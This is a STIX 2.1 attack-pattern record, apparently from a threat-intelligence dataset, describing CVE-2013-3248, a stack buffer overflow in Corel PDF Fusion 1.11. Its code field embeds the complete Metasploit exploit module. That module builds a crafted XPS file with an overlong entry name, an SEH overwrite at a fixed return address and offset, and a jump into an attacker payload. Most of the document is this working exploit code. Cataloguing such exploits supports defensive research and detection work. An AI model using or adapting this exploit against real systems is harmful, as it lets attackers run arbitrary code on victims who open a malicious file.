{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--23ec959c-0ed8-4cb6-bdeb-0ec750786730",
    "created": "2024-08-14T16:35:37.481634Z",
    "modified": "2024-08-14T16:35:37.481647Z",
    "name": "Corel PDF Fusion Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in version 1.11 of Corel PDF Fusion. The vulnerability exists while handling a XPS file with long entry names. In order for the payload to be executed, an attacker must convince the target user to open a specially crafted XPS file with Corel PDF Fusion. By doing so, the attacker can execute arbitrary code as the target user.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/corelpdf_fusion_bof.rb",
            "external_id": "corelpdf_fusion_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3248"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20130720043800/http://secunia.com:80/advisories/52707/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Corel PDF Fusion Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow vulnerability in version 1.11 of\n        Corel PDF Fusion. The vulnerability exists while handling a XPS file with long entry\n        names. In order for the payload to be executed, an attacker must convince the target\n        user to open a specially crafted XPS file with Corel PDF Fusion. By doing so, the\n        attacker can execute arbitrary code as the target user.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Kaveh Ghaemmaghami', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3248' ],\n          [ 'OSVDB', '94933' ],\n          [ 'BID', '61010' ],\n          [ 'URL', 'http://web.archive.org/web/20130720043800/http://secunia.com:80/advisories/52707/' ]\n        ],\n      'Platform'       => [ 'win' ],\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space' => 4000\n        },\n      'Targets'        =>\n        [\n          # Corel PDF Fusion 1.11 (build 2012/04/25:21:00:00)\n          # CorelFusion.exe 2.6.2.0\n          # ret from unicode.nls # call dword ptr ss:[ebp+0x30] # tested over Windows XP SP3 updates\n          [ 'Corel PDF Fusion 1.11 / Windows XP SP3', { 'Ret' => 0x00280b0b, 'Offset' => 4640 } ]\n        ],\n      'DisclosureDate' => '2013-07-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.xps'])\n      ])\n\n  end\n\n\n  def exploit\n    template = [\n      \"[Content_Types].xml\",\n      \"_rels/.rels\",\n      \"docProps/thumbnail.jpeg\",\n      \"docProps/core.xml\",\n      \"FixedDocSeq.fdseq\",\n      \"Documents/1/Pages/_rels/1.fpage.rels\",\n      \"Documents/1/_rels/FixedDoc.fdoc.rels\",\n      \"Documents/1/FixedDoc.fdoc\",\n      \"Documents/1/Structure/Fragments/1.frag\",\n      \"Documents/1/Structure/DocStructure.struct\",\n      \"Documents/1/Pages/1.fpage\",\n    ]\n\n    xps = Rex::Zip::Archive.new\n    template.each do |k|\n      xps.add_file(k, rand_text_alpha(10 + rand(20)))\n    end\n\n    resources_length = \"Resources/\".length\n    sploit = \"Resources/\"\n    sploit << payload.encoded\n    sploit << rand_text(target['Offset'] - sploit.length)\n    sploit << generate_seh_record(target.ret)\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{target['Offset'] + 8 - resources_length}\").encode_string # 8 => seh_record length\n    sploit << rand_text(1500) # Trigger exception\n\n    xps.add_file(sploit, rand_text_alpha(10 + rand(20)))\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file...\")\n    file_create(xps.pack)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-08",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}